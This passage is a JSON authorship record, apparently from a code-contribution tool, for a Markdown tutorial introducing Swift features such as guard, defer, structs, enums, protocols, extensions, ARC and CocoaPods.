        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "With the guard statement, the happy path is not indented:"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "func timeTravel(album: String) {"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "    let year \u003d yearAlbumReleased(album)"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "    guard let past \u003d year else {"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "        // failure case"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "        return"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "    // happy path is not indented"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "    // past contains the non-nil value of year; proceed to do something with past"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "    // past remains defined till the function exits"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s understand how the code above works:"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "1. The code within a `guard` block is only executed if `year` contains a nil value."
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "1. As the `guard` statement is used to transfer program control out of a scope, you must call one of the following functions within the `guard` block: `return`, `break`, `continue`, `throw`. As such, the `guard` statement is meant to enforce the pre-conditions of a method and to perform early return."
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some of the benefits of using `guard` statement over `if-let` statement:"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "1. Unlike the `if-let` statement, using the `guard` statement causes `past` to remain defined and can be used till the function exits."
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "1. While using `if-let` statements can lead to deeply nested `if-let` statements (i.e. pyramid of doom), `guard` statements allow us to have the happy path to be not indented, thereby increasing code readability."
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "### Defer Statements"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "The `defer` key word in Swift provides an easy and safe way to execute some code before leaving current scope. It is helpful when you need to do post-operations in a function which has many points of return."
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "The following code is an example of using a file:"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "let fileDescriptor \u003d open(url.path, O_EVTONLY)"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "if fileDescriptor \u003d\u003d -1 {"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "\tclose(fileDescriptor)"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "\treturn \"Failed\""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "// Use file descriptor"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "close(fileDescriptor)"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "return \"Success\""
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "As you can see from above, we have to close the `fileDescriptor` for every case we consider. This can be problematic when the number of cases increases. Instead, we can use the `defer` statement:"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "let fileDescriptor \u003d open(url.path, O_EVTONLY)"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "defer {"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "    close(fileDescriptor)"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "if fileDescriptor \u003d\u003d -1 {"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "\treturn \"Failed\""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "// Use file descriptor"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "return \"Success\""
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "Using `defer` statement, the file will be closed no matter which branch the program returns. It also has the added advantage of preventing the developer from forgetting to close the file in some cases."
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "This [document](https://docs.swift.org/swift-book/ReferenceManual/Statements.html#grammar_defer-statement) explains more about `defer` statement in Swift."
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "### Data Types"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "#### Structs"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "Apart from the classes (something you are familiar with if you have already learned languages like Java / Python) which you use for creating instances of Reference type, Swift also provides the use of Structs to create instances of Value type. "
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s use a simple example (from [Apple\u0027s own blog on Swift](https://developer.apple.com/swift/blog/?id\u003d10)) to illustrate the difference between Reference types (Classes) and Value types (Structs). "
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "// Value type example"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "struct S { var data: Int \u003d -1 }"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "var a \u003d S()"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "var b \u003d a                       // a is copied to b"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "a.data \u003d 42                     // changes a, not b"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "print(\"\\(a.data), \\(b.data)\")   // prints \"42, -1\\n\""
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "// Reference type example"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "class C { var data: Int \u003d -1 }"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "var x \u003d C()"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "var y \u003d x                       // x is copied to y"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": "x.data \u003d 42                     // changes the instance referred to by x (and y)"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "print(\"\\(x.data), \\(y.data)\")   // prints \"42, 42\\n\""
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": "In the example above, when you assign a reference type variable to another (i.e. `x` and `y`) they both refer to the same memory space. Later when you modify one of the variables, the other one will refer to the new value too. This may not be the desired behavior in some cases. In those cases, value-type variables (e.g., `a` and `b`) can be used to avoid implicit data sharing."
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": "You can think of Structs as a way to create instances that have their own unique copies of data, which can help to make things a lot easier."
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": "If you wish to find out more, here is an [article](https://medium.com/capital-one-developers/reference-and-value-types-in-swift-de792db330b2) that explains the difference between the 2 types, as well as the benefits of value types and when to use them."
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": "#### Enums"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "An enum is a data type that represents of a set of values. For example, we can use `String` to represent the possible types of a barcode. However, this allows us to assign invalid values to it:"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "var barcode \u003d \"qzCode\" // supposed to be \"qrCode\", but we accidentally assigned an invalid value"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "As such, we create an enum to restrict the values that we can assign to a barcode."
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "enum Barcode {"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "    case upc"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "    case qrCode"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": "var barcode \u003d Barcode.qrCode "
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "barcode \u003d Barcode.qzCode // compilation error"
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": "Swift\u0027s enums can have associated values. This enables you to store additional custom information along with each case value, and permits this information to vary each time you use that case in your code. For example, we can have an enum `Barcode` with case values `upc` and `qrCode`. We want to be able to distinguish within each value as each `upc` and `qrCode` can take on different values:"
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": "enum Barcode {"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": "    case upc(Int, Int, Int, Int)"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": "    case qrCode(String)"
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": "    func printCode() {"
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": "        switch self {"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": "        case let .upc(numberSystem, manufacturer, product, check):"
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "-"
        },
        "content": "            print(\"UPC : \\(numberSystem), \\(manufacturer), \\(product), \\(check).\")"
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": "        case let .qrCode(productCode):"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": "            print(\"QR code: \\(productCode).\")"
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": "        }"
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": "let barcode1 \u003d Barcode.qrCode(\"foo\")"
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": "let barcode2 \u003d Barcode.qrCode(\"bar\")"
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": "barcode1.printCode() // prints \"QR code: foo.\""
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
        "content": "barcode2.printCode() // prints \"QR code: bar.\""
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": "Also, enums with associated values is not supported in languages such as [Java](https://stackoverflow.com/questions/30044334/how-can-i-create-a-java-enum-with-associated-values-like-swift-enum), and using a workaround to implement enums with associated values results in code verbosity. Take a look at [Swift\u0027s documentation on Enums](https://developer.apple.com/library/content/documentation/Swift/Conceptual/Swift_Programming_Language/Enumerations.html) for more information about enums."
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": "### Protocol Oriented Programming"
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": "The heart of Swift is Protocol Oriented Programming (POP). POP helps to solve the [bloat that is sometimes caused by Object Oriented Programming (OOP)](http://blogs.perl.org/users/sid_burn/2014/03/inheritance-is-bad-code-reuse-part-1.html) by using composition instead of inheritance for defining new classes based on existing classes."
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "-"
        },
        "content": "Here\u0027s some code to serve as a brief introduction to POP:"
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 278,
        "author": {
          "gitId": "-"
        },
        "content": "First, we first define our protocols."
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "-"
        },
        "content": "protocol Bird {"
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "-"
        },
        "content": "  var canFly: Bool { get }"
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "-"
        },
        "content": "protocol Flyable {"
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "-"
        },
        "content": "  var airspeedVelocity: Double { get }"
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "-"
        },
        "content": "Next, we define the structs that conform to the protocols above."
      },
      {
        "lineNumber": 291,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 292,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 293,
        "author": {
          "gitId": "-"
        },
        "content": "// Penguins can\u0027t fly ):"
      },
      {
        "lineNumber": 294,
        "author": {
          "gitId": "-"
        },
        "content": "struct Penguin: Bird {"
      },
      {
        "lineNumber": 295,
        "author": {
          "gitId": "-"
        },
        "content": "    let canFly \u003d false"
      },
      {
        "lineNumber": 296,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 297,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 298,
        "author": {
          "gitId": "-"
        },
        "content": "struct Eagle: Bird, Flyable {"
      },
      {
        "lineNumber": 299,
        "author": {
          "gitId": "-"
        },
        "content": "    let canFly \u003d true"
      },
      {
        "lineNumber": 300,
        "author": {
          "gitId": "-"
        },
        "content": "    let airspeedVelocity \u003d 160.0"
      },
      {
        "lineNumber": 301,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 302,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 303,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 304,
        "author": {
          "gitId": "-"
        },
        "content": "And if you haven\u0027t noticed, protocols are extremely similar to interfaces in Java. "
      },
      {
        "lineNumber": 305,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 306,
        "author": {
          "gitId": "-"
        },
        "content": "To understand more about POP, watching this [WWDC 2015 talk](https://www.youtube.com/watch?v\u003dg2LwFZatfTI) is highly recommended."
      },
      {
        "lineNumber": 307,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 308,
        "author": {
          "gitId": "-"
        },
        "content": "### Extensions"
      },
      {
        "lineNumber": 309,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 310,
        "author": {
          "gitId": "-"
        },
        "content": "Extensions allow us to add new functionalities to an existing class, structure, enumeration, or protocol type. Suppose we have an `Eagle` struct:"
      },
      {
        "lineNumber": 311,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 312,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 313,
        "author": {
          "gitId": "-"
        },
        "content": "struct Eagle {"
      },
      {
        "lineNumber": 314,
        "author": {
          "gitId": "-"
        },
        "content": "    // some functionalities here"
      },
      {
        "lineNumber": 315,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 316,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 317,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 318,
        "author": {
          "gitId": "-"
        },
        "content": "As development progresses, you realize that you now want `Eagle` to conform to `Bird` and `Flyable` protocols. Instead of editing the code in `Eagle` struct directly, we can use extensions to implement each protocol separately. Do take note that you cannot add stored properties in extensions. As such, `canFly` and `airspeedVelocity` have to be computed properties (for more information, see [here](https://developer.apple.com/library/content/documentation/Swift/Conceptual/Swift_Programming_Language/Properties.html)):"
      },
      {
        "lineNumber": 319,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 320,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 321,
        "author": {
          "gitId": "-"
        },
        "content": "struct Eagle {"
      },
      {
        "lineNumber": 322,
        "author": {
          "gitId": "-"
        },
        "content": "    // we can leave the existing code here untouched"
      },
      {
        "lineNumber": 323,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 324,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 325,
        "author": {
          "gitId": "-"
        },
        "content": "extension Eagle: Bird {"
      },
      {
        "lineNumber": 326,
        "author": {
          "gitId": "-"
        },
        "content": "    var canFly: Bool {"
      },
      {
        "lineNumber": 327,
        "author": {
          "gitId": "-"
        },
        "content": "        return true"
      },
      {
        "lineNumber": 328,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 329,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 330,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 331,
        "author": {
          "gitId": "-"
        },
        "content": "extension Eagle: Flyable {"
      },
      {
        "lineNumber": 332,
        "author": {
          "gitId": "-"
        },
        "content": "    var airspeedVelocity: Double {"
      },
      {
        "lineNumber": 333,
        "author": {
          "gitId": "-"
        },
        "content": "        return 160.0"
      },
      {
        "lineNumber": 334,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 335,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 336,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 337,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 338,
        "author": {
          "gitId": "-"
        },
        "content": "Extensions also allow us to define instance methods and type methods for types which you do not have access to the original source code. For example: "
      },
      {
        "lineNumber": 339,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 340,
        "author": {
          "gitId": "-"
        },
        "content": "```swift"
      },
      {
        "lineNumber": 341,
        "author": {
          "gitId": "-"
        },
        "content": "extension String { // String belongs to Swift Standard Library which we have no access to"
      },
      {
        "lineNumber": 342,
        "author": {
          "gitId": "-"
        },
        "content": "    // This method is copied from: "
      },
      {
        "lineNumber": 343,
        "author": {
          "gitId": "-"
        },
        "content": "    // https://github.com/SwifterSwift/SwifterSwift/blob/master/Sources/Extensions/SwiftStdlib/StringExtensions.swift"
      },
      {
        "lineNumber": 344,
        "author": {
          "gitId": "-"
        },
        "content": "    func isAlphabetic() -\u003e Bool {"
      },
      {
        "lineNumber": 345,
        "author": {
          "gitId": "-"
        },
        "content": "        let hasLetters \u003d rangeOfCharacter(from: .letters, options: .numeric, range: nil) !\u003d nil"
      },
      {
        "lineNumber": 346,
        "author": {
          "gitId": "-"
        },
        "content": "        let hasNumbers \u003d rangeOfCharacter(from: .decimalDigits, options: .literal, range: nil) !\u003d nil"
      },
      {
        "lineNumber": 347,
        "author": {
          "gitId": "-"
        },
        "content": "        return hasLetters \u0026\u0026 !hasNumbers"
      },
      {
        "lineNumber": 348,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 349,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 350,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 351,
        "author": {
          "gitId": "-"
        },
        "content": "var foo: String \u003d \"a1\""
      },
      {
        "lineNumber": 352,
        "author": {
          "gitId": "-"
        },
        "content": "print(foo.isAlphabetic()) // prints \"false\""
      },
      {
        "lineNumber": 353,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 354,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 355,
        "author": {
          "gitId": "-"
        },
        "content": "To find out more about extensions, take a look at [Swift\u0027s documentation on Extensions](https://developer.apple.com/library/content/documentation/Swift/Conceptual/Swift_Programming_Language/Extensions.html)"
      },
      {
        "lineNumber": 356,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 357,
        "author": {
          "gitId": "-"
        },
        "content": "### Automatic Reference Counting"
      },
      {
        "lineNumber": 358,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 359,
        "author": {
          "gitId": "-"
        },
        "content": "A few keywords unique to Swift are `strong`, `weak` and `unowned`, which have to do with Swift\u0027s way of memory management, [Automatic Reference Counting (ARC)](https://developer.apple.com/library/content/documentation/Swift/Conceptual/Swift_Programming_Language/AutomaticReferenceCounting.html). "
      },
      {
        "lineNumber": 360,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 361,
        "author": {
          "gitId": "-"
        },
        "content": "Essentially, when an instance of a class is created, a chunk of memory is allocated to it until it is no longer strongly referenced by anything. References are strong by default. Thus, if we have an Object A (a `UIViewController`) that creates an Object B (a `UIAlertController`), B would be strongly referenced by A. However, B might also need access to a variable in A, such that A may be strongly referenced by B, resulting in a reference cycle."
      },
      {
        "lineNumber": 362,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 363,
        "author": {
          "gitId": "-"
        },
        "content": "Reference cycles are bad, because they cause memory leaks. Even though A and B are no longer needed eventually, A and B will still sit in memory since they are both strongly referenced by each other. This is why we need the `strong`, `weak` and `unowned` keywords, to resolve reference cycles. "
      },
      {
        "lineNumber": 364,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 365,
        "author": {
          "gitId": "-"
        },
        "content": "Here is an [article](https://krakendev.io/blog/weak-and-unowned-references-in-swift) with greater in-depth explanation and examples."
      },
      {
        "lineNumber": 366,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 367,
        "author": {
          "gitId": "-"
        },
        "content": "### CocoaPods"
      },
      {
        "lineNumber": 368,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 369,
        "author": {
          "gitId": "-"
        },
        "content": "[CocoaPods](https://guides.cocoapods.org/using/getting-started.html) is a dependency manager for Swift and Objective-C Cocoa projects which has over 58 thousand libraries and is used in over 3 million apps. Instead of reinventing the wheel, you can check this out to obtain code that helps resolve common issues. If you have done something new with Swift, you can also make your code into a library with CocoaPods for others to use!"
      },
      {
        "lineNumber": 370,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 371,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Get Started?"
      },
      {
        "lineNumber": 372,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 373,
        "author": {
          "gitId": "-"
        },
        "content": "A Macbook is required for Swift development, but an iPhone or iPad is not. The Swift IDE `X-Code` has built-in simulators for all mobile devices."
      },
      {
        "lineNumber": 374,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 375,
        "author": {
          "gitId": "-"
        },
        "content": "If you have not learnt any other programming languages before, this [Game App](https://www.apple.com/swift/playgrounds/) could be a good choice to learn swift as well as programming."
      },
      {
        "lineNumber": 376,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 377,
        "author": {
          "gitId": "-"
        },
        "content": "If you are familiar with some programming languages, reading the [Language Guide in the official documentation](https://developer.apple.com/library/content/documentation/Swift/Conceptual/Swift_Programming_Language/) is recommended, since it explains everything quite clearly, albeit being quite verbose."
      },
      {
        "lineNumber": 378,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 379,
        "author": {
          "gitId": "-"
        },
        "content": "If you are really pressed for time, here are a couple of cheatsheets with code examples:"
      },
      {
        "lineNumber": 380,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 381,
        "author": {
          "gitId": "-"
        },
